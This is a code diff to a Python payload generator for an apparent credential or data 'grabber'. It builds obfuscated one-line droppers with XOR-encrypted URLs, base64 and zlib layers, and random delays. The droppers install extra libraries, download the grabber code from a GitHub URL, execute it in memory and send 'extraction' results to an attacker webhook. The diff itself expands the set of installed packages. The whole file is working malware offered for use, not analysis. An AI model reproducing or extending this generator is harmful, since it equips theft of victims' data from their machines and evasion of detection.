@@ -32,8 +32,15 @@ def create_short_payload(webhook_url, github_url):
     import zlib
 
     minimal_core = f"""
-import subprocess,requests,base64,zlib
-subprocess.run([__import__('sys').executable,'-m','pip','install','requests','pycryptodome'])
+import subprocess,sys
+for lib in ['requests','pycryptodome','psutil','websocket-client']:
+    try:subprocess.run([sys.executable,'-m','pip','install',lib],check=False)
+    except:pass
+try:subprocess.run([sys.executable,'-m','pip','install','wmi'],check=False)
+except:pass
+try:subprocess.run([sys.executable,'-m','pip','install','pywin32'],check=False)
+except:pass
+import requests,base64,zlib
 r=requests.get('{github_url}')
 c=r.text.replace('WEBHOOK_PLACEHOLDER','{webhook_url}')
 e=base64.b64encode(zlib.compress(c.encode(),9)).decode()
@@ -49,7 +56,7 @@ exec(zlib.decompress(base64.b64decode(e)))
 def create_long_payload(webhook_url, github_url):
     import zlib, bz2
 
-    libs = "72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e74"
+    libs = "72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e742c776d692c70797769366e3332"
 
     def x(s,k=42):return''.join(chr(ord(c)^k)for c in s)
 
@@ -57,8 +64,11 @@ def create_long_payload(webhook_url, github_url):
     g = base64.b64encode(x(github_url,42).encode()).decode()
 
     core = f"""
-import subprocess,requests,base64,zlib,bz2,time,random
-subprocess.run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('{libs}').decode().split(','))
+import subprocess,sys,base64,zlib,bz2,time,random
+for lib in bytes.fromhex('{libs}').decode().split(','):
+    try:subprocess.run([sys.executable,'-m','pip','install',lib],check=False)
+    except:pass
+import requests
 time.sleep(random.random()*.3+.1)
 def d(s,k=42):return''.join(chr(ord(c)^k)for c in s)
 u=d(base64.b64decode('{g}').decode())
@@ -94,7 +104,7 @@ exec(d3(encrypted))
     shortest = min(optimizations, key=len)
 
     if len(shortest) > 800:
-        simple_core = f"__import__('subprocess').run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e74').decode().split(','));r=__import__('requests').get(''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{g}').decode()));c=r.text.replace('WEBHOOK_PLACEHOLDER',''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{w}').decode()));e=__import__('base64').b64encode(__import__('zlib').compress(c.encode(),9)).decode();exec(__import__('zlib').decompress(__import__('base64').b64decode(e)))"
+        simple_core = f"import subprocess,sys;[subprocess.run([sys.executable,'-m','pip','install',lib],check=False)for lib in bytes.fromhex('72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e742c776d692c70797769366e3332').decode().split(',')];r=__import__('requests').get(''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{g}').decode()));c=r.text.replace('WEBHOOK_PLACEHOLDER',''.join(chr(ord(c)^42)for c in __import__('base64').b64decode('{w}').decode()));e=__import__('base64').b64encode(__import__('zlib').compress(c.encode(),9)).decode();exec(__import__('zlib').decompress(__import__('base64').b64decode(e)))"
         simple_comp = base64.b64encode(zlib.compress(simple_core.encode(), 9)).decode()
         simple_payload = f";import zlib,base64;exec(zlib.decompress(base64.b64decode('{simple_comp}')))"
         if len(simple_payload) < len(shortest):
@@ -112,9 +122,9 @@ def create_ultra_stealth_payload(webhook_url, github_url):
     w_enc = xor_encrypt(webhook_url)
     g_enc = xor_encrypt(github_url)
     
-    libs_hex = "72657175657374732c707963727970746f646f6d65"
+    libs_hex = "72657175657374732c707963727970746f646f6d652c70737574696c2c776562736f636b65742d636c69656e742c776d692c70797769366e3332"
     
-    core = f"__import__('subprocess').run([__import__('sys').executable,'-m','pip','install']+bytes.fromhex('{libs_hex}').decode().split(','));__import__('time').sleep(__import__('random').random()*.3);u=''.join(chr(ord(c)^69)for c in __import__('base64').b64decode('{g_enc}').decode());w=''.join(chr(ord(c)^69)for c in __import__('base64').b64decode('{w_enc}').decode());r=__import__('requests').get(u);c=r.text.replace('WEBHOOK_PLACEHOLDER',w);e=__import__('base64').b64encode(__import__('zlib').compress(c.encode(),9)).decode();exec(__import__('zlib').decompress(__import__('base64').b64decode(e)))"
+    core = f"import subprocess,sys;[subprocess.run([sys.executable,'-m','pip','install',lib],check=False)for lib in bytes.fromhex('{libs_hex}').decode().split(',')];__import__('time').sleep(__import__('random').random()*.3);u=''.join(chr(ord(c)^69)for c in __import__('base64').b64decode('{g_enc}').decode());w=''.join(chr(ord(c)^69)for c in __import__('base64').b64decode('{w_enc}').decode());r=__import__('requests').get(u);c=r.text.replace('WEBHOOK_PLACEHOLDER',w);e=__import__('base64').b64encode(__import__('zlib').compress(c.encode(),9)).decode();exec(__import__('zlib').decompress(__import__('base64').b64decode(e)))"
     
     comp1 = zlib.compress(core.encode(), 9)
     comp2 = base64.b64encode(comp1).decode()
@@ -230,7 +240,7 @@ def run_mini_payload_generator():
                 "2. Random timing delays for stealth",
                 "3. BZ2 + Zlib double decompression",
                 "4. XOR + Base64 URL encryption",
-                "5. Installs stealth libraries (4 packages)",
+                "5. Installs stealth libraries (6 packages)",
                 "6. Triple-layer encryption of grabber code",
                 "7. Executes advanced data extraction",
                 "8. Sends encrypted results to webhook"
@@ -241,7 +251,7 @@ def run_mini_payload_generator():
                 "2. Double-compression (Zlib + Base64)",
                 "3. XOR encryption of URLs (key=69)",
                 "4. Random timing delays (0-0.3s)",
-                "5. Installs core libraries (requests, pycryptodome)",
+                "5. Installs core libraries (6 packages)",
                 "6. Double-layer encryption of downloaded code",
                 "7. Base64 + Zlib decryption chain",
                 "8. In-memory execution only",
